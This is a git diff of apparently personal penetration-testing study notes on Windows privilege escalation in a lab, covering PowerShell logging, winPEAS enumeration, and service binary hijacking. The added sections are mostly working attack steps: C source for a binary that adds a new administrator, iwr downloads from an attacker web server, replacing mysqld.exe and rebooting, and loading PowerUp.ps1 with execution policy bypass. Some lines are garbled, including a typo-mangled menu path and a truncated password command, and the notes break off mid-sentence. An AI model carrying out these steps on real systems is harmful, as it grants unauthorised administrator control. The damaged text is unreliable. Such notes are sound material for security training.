@@ -401,7 +401,7 @@ There is often PowerShell logging mechanisms enabled on enterprise Windows cliet
 
 Transcription (over-the-shoulder-transcription) stores information in transcript files, typically in the home directories of users, central directories for all users on a machine, or in a network share collecting files from all configured machines. 
 
-Script Blocking Logging records commands and blocks of script code of events while executing. The logging is much broader because it records the full content of code and commands as they are executed. Such an event also contains the original representation of commands or encoded code!
+Script Blocking Logging records commands and blocks of script code of events while executing. The logging is much broader because it records the full content of code and commands as they are executed. Such an event also contains the original representation of commands or encoded code! Find the Script Blocking events in Event Viewer under A[[;ocatopms amd Services > Microsoft > Windows > PowerShell > Operational. Filter for Event ID 4101.
 
 ```console
 // check powershell history of a user
@@ -436,7 +436,7 @@ PSVersion: 5.1.22000.282
 ...
 **********************
 Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
-PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+PS C:\Users\dave> $password = ConvertTo-SecureString "C -AsPlainText -Force
 PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
 PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
 PS C:\Users\dave> Stop-Transcript
@@ -493,3 +493,166 @@ d-----         7/20/2022   8:07 AM                Windows
 d-----         6/16/2022   1:17 PM                xampp
 ```
 
+### Automated Enumeration
+
+NOTE: Automated tools might be blocked by AV. Try AV evasion, use other tools like Seatbelt and Jaws, or do the enum manually.
+
+To quicken this up, let's try winPEAS.
+
+```console
+// only if not already done, put in home dir and start web server
+$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+
+$ python3 -m http.server 80
+
+// connect to bind shell on target
+$ nc 192.168.201.220 4444
+
+C:\Users\dave> powershell
+
+// user iwr command with our winPEAS URL
+
+PS C:\Users\dave> iwr -uri http://222.222.222.222/winPEASx64.exe -Outfile winPEAS.exe
+
+C:\Users\dave> .\winPEAS.exe
+
+// the output of this instance reported a different OS version, so never trust automated tools. Don't forget to try Seatbelt and JAWS.
+```
+
+## Leveraging Windows Services
+
+Windows services are long-running background exes or apps that are managed by the Service Control Manager and are comparable to daemons on Unix. They can be managed by the Services snap-in, PS, or sc.exe in the command line. Windows uses the LocalSystem (includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators in its token), Network Service, and Local Service user accounts in order to run its own services. Programs or users creating services can choose any one of those accounts, a domain user, or a local user.
+
+Windows Privilege Escalation focuses heavily on searching Windows services for attack vectors.
+
+### Service Binary Hijacking
+
+Every service has a binary file that is executed when the service is started or transitioned into a running state. Imagine a dev made a program and installs an app as a Windows service. While installing, the dev doesn't secure the program's perms, so the entire Users group can Read and Write. This allows a lower-privileged user to replace the program with a malicious one. The user just needs to restart the service or, if the service is configured to start automatically, reboot the machine for the malicious replacement to run. Better yet, the malicious replacement will run with the privileges of the service, like LocalSystem.
+
+To get a list of Windows services, we can use GUI-based services.msc or CMD-based Get-Service or Get-CimInstance.
+
+```console
+// NOTE: when using network logons like WinRM or a bind shell, Get-CimInstance and Get-Service will give you "permission denied" when querying for services with a non-admin user. Use an interactive logon like RDP instead.
+
+$ xfreerdp /v:192.168.201.220 /u:dave
+
+// get list of Windows services
+
+PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Apache2.4                     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
+mysql                         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+
+// NOTE: Anything under the \xampp\ dir is user-installed, so the dev is in charge of perms, whereas \System32\ installs, the dev does not control the permisisons. This can make it vulnerable to service binary hijacking.
+
+// emum the perms on both
+Mask 	Permissions
+F 	Full access
+M 	Modify access
+RX 	Read and execute access
+R 	Read-only access
+W 	Write-only access
+
+PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
+C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
+                              NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Users:(RX)
+                              NT AUTHORITY\Authenticated Users:(RX)
+
+PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
+C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Administrators:(F)
+                              BUILTIN\Users:(F)
+
+// Users have Full Access permissions. The missing I indicator before the permission tells us that it was set on purpose, not inherited by the parent directory.
+
+// create a quick bimary on kali
+
+$ nano adduser.c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+// now transfer to target
+
+PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  
+
+PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+
+PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+// need to restart the service to execute the binary
+
+PS C:\Users\dave> net stop mysql
+System error 5 has occurred.
+
+Access is denied.
+
+// access denied is expected, most services are managed only by admins
+// new approach - if the servie Startup Type is set to "Automatic", we could try just rebooting the machine.
+
+PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+Name  StartMode
+----  ---------
+mysql Auto
+
+// in order to reboot, we need a user who has the SeShutDownPrivilege assigned (disabled just means if it is on for the currently running process [whoami])
+
+PS C:\Users\dave> whoami /priv
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeSecurityPrivilege           Manage auditing and security log     Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+// always try to avoid reboots in prod
+
+PS C:\Users\dave> shutdown /r /t 0
+
+// after reboot
+
+PS C:\Users\dave> Get-LocalGroupMember administrators
+
+ObjectClass Name                      PrincipalSource
+----------- ----                      ---------------
+User        CLIENTWK220\Administrator Local
+User        CLIENTWK220\BackupAdmin   Local
+User        CLIENTWK220\dave2         Local
+User        CLIENTWK220\daveadmin     Local
+User        CLIENTWK220\offsec        Local
+
+// now we could use runas to get an interactive shell or use msfvenom to create a reverse shell exe.
+// restore the service by deleting your malicious binary, restoring the backed up original binary, and rebooting the system.
+```
+
+Let's also quickly cover an automated tool, PowerUp.ps1, and see if it will detect this privilage escalation vector.
+
+```console
+$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+
+$ python3 -m http.server 80
+
+// switch to victim terminal
+
+PS C:\Users\dave> iwr -uri http://222.222.222.222/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+ . .\PowerUp.ps1
+PS C:\Users\dave> Get-ModifiableServiceFile
+
+// you can use the AbuseFunction to have it create a john:Password123! user and restart the service if you have the right permissions. if you don't, you'll need to reboot the entire machine.
+
+PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
+// throws error because 
+```
